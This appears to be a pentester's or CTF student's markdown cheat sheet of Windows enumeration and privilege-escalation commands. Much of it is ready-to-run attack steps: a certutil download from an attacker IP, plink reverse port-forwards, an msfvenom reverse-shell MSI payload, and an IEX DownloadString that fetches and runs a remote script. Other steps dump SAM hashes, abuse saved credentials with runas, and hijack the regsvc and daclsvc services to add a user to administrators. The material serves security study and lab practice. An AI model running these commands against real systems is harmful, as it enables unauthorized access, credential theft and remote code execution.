# Enumeration 

## Windows

**Payloads All the Things**

### user group enum
- `whoami` 
- `whoami /priv`
	- look for juicy potato priv
- `whoami /groups`
- `net user student` Supply user 
- `net user` List all users
- payload all the things tokens 


### System Enum

- `hostname`
- `systeminfo`
- `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
- `tasklist /SVC` Services 
- `wmic qfe get Caption, Description, HotFixID, InstalledOn` enum KBs and patch level

### Passwords 

- `findstr /si password *.txt *.ini *.config` look for passwords in cmd
- SAM File locations SAM, SECURITY, SYSTEM `C:\Windows\System32\config`
- secretsdump.py on the SAM files, part of impacket


### Networking 

- `ipconfig /all` Interfaces 
- `route print` network routing tables  
- `netstat -ano` Network connections 
- `arp -a` arp table

### Firewall 

- `netsh advfirewall show currentprofile` Check Firewall 
- `netsh advfirewall show rule name=all`  Check Firewall Rules 
- `netsh advfirewall firewall dump` dump all rules
- `netsh firewall show state` 
- `netsh firewall show config`

### AV 

- `sc query windefend` service control look for windows defender
- `sc type= service` find all services 

### Look for files in ftp 

- `dir -a` hidden files 
- recycle bin is in the root of `C:`
- sam, system, software, security db 
- windowsupdate.log 
- license.rtf 

### Port Forwarding 

Kali
- plink.exe (download a new version)
- Host file on Linux
- `sudo apt install ssh`
- `/etc/ssh/sshd_config` edit ssh 
- find and set to `PermitRootLogin yes` save 
- restart ssh

Winodows
- `certutil -urlcache -f http://10.10.14.5/plink.exe plink.exe` download on victim
- `plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.5` forward 445 on Local host to port on 445 victim
- `cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4` alertnate plink command on windows

Kali 
- run winexe to run windows commands from linux to remove linux hosts `win.exe -U Administrator%Welcome1! //127.0.01 "cmd.exe"` hit enter several times 

### Auto Runs 

Find and replace files that will run with higher permissions on logon 

- Use sysinternals to look for autoruns `./Autoruns/Autoruns.64.exe`
- Run access check. Checks permissions to file. Look for RW Everyone  `Accesschk\accesschk64.exe -wvu "c:\programname"`
#### PowerUp

- executionpolicy bypass powerhsell one liner `powershell -ep bypass`
- run `. .\PowerUp.ps1`
- `Invoke-AllChecks`


### Auto Elevate

- `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer` check for auto elevate 
- `reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer` check for auto elevate in local machine 
- With the auto elevate enabled we could make an MSI file and it would run our code in prvileged mode 
- payload that can be run with msi `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f msi -o shell_reverse.msi`


### Run As

- `cmdkey /list` view stored credentials
- `c:\windows\system32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt"` Using the user found from cmdkey run as that user run cmd /c to use command to cat out the file to a new file 

### PowerShell Run as with username and password 

1. `$pass = ConvertTo-SecureString "password" -AsPlainText -Force`
2. `$pass` expect System.SecuritySecureString 
3. `$cred = New-Object System.Management.Automation.PSCredential("Chris", $pass)
4. `$cred` expect user name and System.Security.secure String  
5. Check combinations with crackmap exec `crackmapexec 10.10.10.151 wsmb -u chris -p 'sfsfsfsd' 
6. `Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {}`


### Registry ACLs regsvc ACL

1. `powershell -ep bypass`
2. `Get-Acl -Path hklm:\system\CurrentControlSet\services\regsvc | fl` Check acl for this key 
3. Look for `NT Authority\Interactive` allow full control
4. copy `C:\Users\User\Desktop\Tools\Source\windows_service.c` to kali vm. You can use FTP to do this.<https://github.com/sagishahar/scripts/blob/master/windows_service.c> 
5. Modify file replace `whoami > c:\\...` with `cmd.exe /k net localgroup administrators user /add`
6. compile `w64-mingw32-gcc windows_service.c -o x.exe`
7. copy to windows computer in a temporary file path lcoation 
8. on windows execut `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
9. `sc start regsvc` start service 
10. `net localgroup administrators` confirm group addition 

### Executable files overwrite 

1. open command prompt
2. `powershell -ep bypass` 
3. `. .\PowerShell.ps1`
4. `Invoke-Allchecks`
5. find writable file and replace 

Check file permissions with sysinternals accesscheck64 tool

- `.\accesschk\accesschk64.exe -wvu "\C:\program files\file permissions service"`

### Start up programs 

*Not likely on CTF*

- `icacls.exe "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`

### DLL Hijacking 

- proc mon set filter `Restult is NAME NOT FOUND`
- filter `Path ends with .dll`

- <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md>


### Binary Paths 

- Access Checks `accesschk64.exe -uwcv Everone *` suppress errors, show service name, writeable, verbose  
- Specifically check service ACL `/.accesschk64.exe -uwvc daclsvc`
- query ervice `sc qc daclsvc`
- change bin path if you hae the change config flag `sc config daclsvc binpath= "net localgroup administrators username /add"`
- start service `sc start daclsvc`


### Unquoted Service Paths 

- look for unquoted service paths. 

### Windows Commands 

#### Find Files

- `where /R c:\windows bash.exe` find recurseivly bash.exe starting in c:\windows

#### Alternate Data Streams

- `dir /R` alternate data streams
- `more < hm.txt:root.txt:$DATA` - write out the alertnate data stream 


#### Power Shell

- executionpolicy bypass powerhsell one liner `powershell -ep bypass` 


### uncatagorized
- `schtasks /query /fo LIST /v` Scheduled Tasks /v is optional 
- `wmic product get name, version, vendor` enum apps 
- `c:\Tools\privilege_escalation\SysinternalsSuite>accesschk.exe -uws "Everyone" "C:\Prog
ram Files"` Check for file permissions 
- `Get-ChildItem "C:\Program Files" -R
ecurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}` Check File Permission PowerShell 
- `mountvol` check for unmounted volume 
- `driverquery /v /fo csv | convertfrom-CSV | select-object 'Display Name', 'Start Mode', Path` Driver enum (use powershell) 
- `Get-WmiObject Win32_PnPSignedDriver | select-object DeviceName, DeriverVersion, Manufacturer | where-object {$_.DeviceName -like "*VMware*"}` get driver version. 

### Kernel 

- <https://github.com/SecWiki/Windows-kernel-exploits/tree/master>

### Disks

- `wmic logicaldisk get caption,description,providername` get all disks

### Automated tools 

- windows-privesc-check
- EXE
	- winpeas.exe
	- watson.exe
	- sharpup.exe
- PowerShell
	- sherlock.ps1
	- powerup.ps1
	- jaws-enum.ps1
- Other 
	- windows-exploit-suggester.py (runs on attack machine)
	- Explot suggester (metasploit)

#### PowerUp

- run and invoke. Add `Invoke-AllChecks` to the bottom of the script. 
- `echo IEX(New-Object Net.WebClient).DownloadString('http://1.1.1.1/PowerUp.ps1') | powershell -noprofile -`
